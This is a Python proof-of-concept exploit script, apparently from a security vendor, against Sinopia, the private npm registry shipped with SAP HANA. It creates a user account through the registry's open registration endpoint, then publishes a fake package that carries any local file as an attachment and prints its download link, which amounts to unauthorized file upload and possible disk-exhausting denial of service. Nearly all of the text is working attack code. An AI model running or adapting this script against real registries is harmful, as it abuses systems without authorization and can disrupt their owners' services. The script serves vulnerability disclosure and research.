#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
import requests
import random
import json
help_desc = \
    '''
POC to upload any files to Sinopia (HANA private npm registry)
by creating a fake package and pushing data to it.
'''
parser = argparse.ArgumentParser(description=help_desc,
                                 formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-H', '--host', default='127.0.0.1',
                    help='Sinopia host')
parser.add_argument('-p', '--port', default=50005, type=int,
                    help='Sinopia port')
parser.add_argument('-f', '--file', help='File to upload')
args = parser.parse_args()
base_url = 'http://%s:%s' % (args.host, args.port)
random = random.randint(0, 1000000)
packagename = u'fakepackage%s' % random
package_endpoint = '/%s' % packagename
createuser_endpoint = '/-/user/org.couchdb.user:dosuser'
file_content = open(args.file).read()
headers = {'content-type': 'application/json',
           'user-agent': 'npm/1.4.21 node/v0.10.25 linux x64'}
json_adduser = {
    'name': 'dosuser',
    'password': 'dosuser',
    'email': 'dos@erpscan.com',
    '_id': 'org.couchdb.user:dosuser',
    'type': 'user',
    }
r = requests.put(base_url + createuser_endpoint, headers=headers,
                 data=json.dumps(json_adduser))
print r.status_code, r.text
json_data = {
    'id': packagename,
    'name': packagename,
    'versions': {'1.0.%s' % random: 'XXX'},
    '_attachments': {args.file: {'contenttype': 'application/binary',
                     'data': file_content.encode('base64'),
                     'length': len(file_content)}},
    }

r = requests.put(base_url + package_endpoint, headers=headers,
                 auth=('dosuser', 'dosuser'),
                 data=json.dumps(json_data))
print r.status_code, r.text
if r.status_code &gt;= 200 and r.status_code &lt; 300:
    print 'Download link of you file is http://%s:%s/%s/-/%s' \
        % (args.host, args.port, packagename, args.file)</textarea></div>
